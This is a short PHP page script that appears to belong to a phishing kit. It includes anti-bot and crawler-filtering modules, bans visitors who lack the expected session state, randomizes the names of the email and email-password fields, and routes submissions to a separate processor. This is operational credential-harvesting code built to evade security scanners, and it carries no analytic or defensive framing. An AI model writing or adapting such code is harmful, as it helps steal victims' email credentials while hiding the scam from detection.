<?php
session_start();
error_reporting(0);
include '../../autob/bt.php';
include '../../autob/basicbot.php';
include '../../autob/uacrawler.php';
include '../../autob/refspam.php';
include '../../autob/ipselect.php';
include "../../autob/bts2.php";
if(!isset($_SESSION['emailbeenset']) && isset($_SESSION['fldr'])){banbot();};
$idc=md5("esub".uniqid());
$proc="../".$_SESSION['processor'];
$ename=gaN("email");
$pname=gaN("emailpass");
$epage="../".$index.'?'.genv('email');
if(!isset($_SESSION['email'])){header('location:'.$epage);};
if(isset($_GET[$theerrkey])){$eshow="?".$theerrkey."=On";};
?>